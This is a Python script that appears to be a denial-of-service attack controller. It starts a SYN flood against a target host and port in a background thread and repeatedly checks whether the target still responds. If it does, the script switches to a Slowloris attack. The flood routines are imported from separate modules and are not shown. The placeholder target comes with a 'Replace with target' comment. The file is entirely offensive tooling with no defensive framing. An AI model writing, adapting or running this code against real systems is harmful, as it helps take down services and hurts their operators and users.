import threading
import time
import socket
import subprocess
from syn_flood import syn_flood
from slowloris import slowloris

def is_target_responsive(ip, port, attempts=3, timeout=2):
    responsive_count = 0
    for _ in range(attempts):
        try:
            s = socket.create_connection((ip, port), timeout=timeout)
            s.close()
            responsive_count += 1
        except socket.error:
            pass
        time.sleep(1)
    return responsive_count == attempts

def start_syn_flood(ip, port):
    syn_thread = threading.Thread(target=syn_flood, args=(ip, port), daemon=True)
    syn_thread.start()
    return syn_thread

def controller(target_ip, target_port=80):
    print("[*] Controller started...")
    syn_thread = start_syn_flood(target_ip, target_port)

    while True:
        print("[*] Probing target responsiveness...")
        if is_target_responsive(target_ip, target_port):
            print("[!] Target is consistently responsive. Pivoting to Slowloris...")
            # Killing SYN flood thread is non-trivial in threads; use subprocess or flags in real-world use
            slowloris(target_ip, target_port)
            break
        else:
            print("[*] SYN flood seems effective. Continuing...")
        time.sleep(10)

if __name__ == "__main__":
    controller("127.0.0.1", 80)  # Replace with target
